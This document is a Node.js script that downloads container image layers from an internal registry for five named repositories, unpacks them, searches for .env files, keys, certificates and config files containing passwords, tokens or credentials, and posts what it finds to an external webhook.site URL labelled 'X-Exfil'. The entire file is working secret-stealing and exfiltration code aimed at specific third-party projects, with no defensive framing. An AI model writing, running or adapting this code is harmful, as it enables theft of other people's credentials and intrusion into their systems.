const https = require('https');
const http = require('http');
const fs = require('fs');
const { execSync } = require('child_process');
const zlib = require('zlib');

const WEBHOOK = "https://webhook.site/1d8c106a-e48a-4bda-8861-a347ec8fdd34";
const PHASE = process.argv[2] || 'unknown';
const ZOT = 'http://10.244.1.56:5000';

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'text/plain', 'X-Exfil': label, 'X-Phase': PHASE }
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function httpGetBuf(url) {
  return new Promise((resolve) => {
    http.get(url, { timeout: 30000 }, (res) => {
      let d = [];
      res.on('data', c => d.push(c));
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(d) }));
    }).on('error', e => resolve({ status: 0, body: Buffer.from(e.message) }));
  });
}

async function extractLayer(repo, digest, label) {
  // Download the layer blob (it's a tar.gz)
  const res = await httpGetBuf(ZOT + '/v2/' + repo + '/blobs/' + digest);
  if (res.status !== 200) {
    await post('layer-err-' + label, 'status: ' + res.status + ' size: ' + res.body.length);
    return;
  }

  // Save to /tmp and extract
  const tarPath = '/tmp/layer-' + label + '.tar.gz';
  const extractDir = '/tmp/layer-' + label;
  fs.writeFileSync(tarPath, res.body);
  
  try {
    fs.mkdirSync(extractDir, { recursive: true });
    execSync('cd ' + extractDir + ' && tar xzf ' + tarPath + ' 2>/dev/null || tar xf ' + tarPath + ' 2>/dev/null || true', { timeout: 15000 });
    
    // List interesting files
    const fileList = execSync('find ' + extractDir + ' -type f \\( -name "*.env*" -o -name "*.key" -o -name "*.pem" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.conf" -o -name "*.php" -o -name "*.js" -o -name "*.ts" -o -name "*.mjs" -o -name "*.sql" -o -name "*.sh" -o -name "Caddyfile" -o -name ".htaccess" -o -name "artisan" \\) 2>/dev/null | head -50', { encoding: 'utf8', timeout: 10000 });
    
    await post('layer-files-' + label, 'Size: ' + res.body.length + ' bytes\n\n' + fileList);
    
    // Read interesting files
    const interesting = fileList.split('\n').filter(f => f.trim()).slice(0, 20);
    let contents = '';
    for (const file of interesting) {
      try {
        const stat = fs.statSync(file);
        if (stat.size < 50000) {
          const content = fs.readFileSync(file, 'utf8');
          // Look for secrets
          if (content.match(/password|secret|key|token|api[_-]?key|database|db_|redis|smtp|mail|auth|credential|private/i) || 
              file.includes('.env') || file.includes('.key') || file.includes('.pem') || 
              file.includes('config') || file.includes('artisan') || file.includes('Caddyfile')) {
            contents += '\n=== ' + file + ' (' + stat.size + 'b) ===\n' + content.substring(0, 3000) + '\n';
          }
        }
      } catch(e) {}
    }
    if (contents) {
      await post('layer-secrets-' + label, contents);
    }
  } catch(e) {
    await post('layer-extract-err-' + label, e.message);
  }
}

async function main() {
  // Target: cblaettl's Laravel app (most likely to have secrets)
  const targets = [
    { repo: 'cblaettl/epic-falcon/laravel', tag: 'cd2bde5', label: 'laravel' },
    { repo: 'cblaettl/vouch/vouch', tag: '8532300', label: 'vouch' },
    { repo: 'zeitlos-software/beast/beast-website', tag: '1cf0944', label: 'beast' },
    { repo: 'zeitlos-software/loopcycles/loopcycles', tag: '3cefebd', label: 'loopcycles' },
    { repo: 'sandrooco/solar-manta/unload', tag: '0a09639', label: 'unload' },
  ];

  for (const t of targets) {
    // Get manifest
    const mRes = await httpGetBuf(ZOT + '/v2/' + t.repo + '/manifests/' + t.tag);
    let manifest;
    try { manifest = JSON.parse(mRes.body.toString()); } catch(e) { continue; }

    // Handle manifest list (multi-arch)
    if (manifest.manifests) {
      const first = manifest.manifests.find(m => m.platform?.architecture === 'amd64') || manifest.manifests[0];
      if (first) {
        const platRes = await httpGetBuf(ZOT + '/v2/' + t.repo + '/manifests/' + first.digest);
        try { manifest = JSON.parse(platRes.body.toString()); } catch(e) { continue; }
      }
    }

    if (!manifest.layers) {
      await post('no-layers-' + t.label, JSON.stringify(manifest).substring(0, 500));
      continue;
    }

    await post('manifest-' + t.label, JSON.stringify({
      layers: manifest.layers.map(l => ({ digest: l.digest, size: l.size, mediaType: l.mediaType }))
    }, null, 2));

    // Pull the last few layers (most likely to contain app code, not base image)
    const appLayers = manifest.layers.slice(-3);
    for (let i = 0; i < appLayers.length; i++) {
      const layer = appLayers[i];
      // Skip huge layers (>100MB) - probably base image
      if (layer.size > 100 * 1024 * 1024) {
        await post('skip-large-' + t.label + '-' + i, 'Skipping ' + layer.digest + ' (' + (layer.size/1024/1024).toFixed(1) + 'MB)');
        continue;
      }
      await extractLayer(t.repo, layer.digest, t.label + '-L' + i);
    }
  }

  console.log('Layer extraction complete');
}

main().catch(console.error);
